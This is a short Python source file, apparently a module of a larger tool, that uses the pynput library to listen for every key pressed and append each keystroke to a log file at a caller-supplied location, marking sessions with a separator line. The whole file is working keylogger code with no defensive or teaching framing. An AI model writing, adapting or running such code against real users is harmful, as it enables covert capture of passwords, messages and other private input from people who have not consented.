# For Getting Keystrokes
from pynput.keyboard import Key,Listener

keys_info = ""


def on_press(key):
    k = str(key).replace("'","")
    file = open(keys_info,"a")
    if key == Key.space:
        file.write("\n")

    else :
        file.write(k)
    file.close()


def keylogger(location):
    global keys_info
    keys_info = location
    file = open(keys_info,"a")
    file.write("\n\n"+"---_____---"+"\n\n")
    file.close()
    with Listener(on_press=on_press) as List:
        List.join()

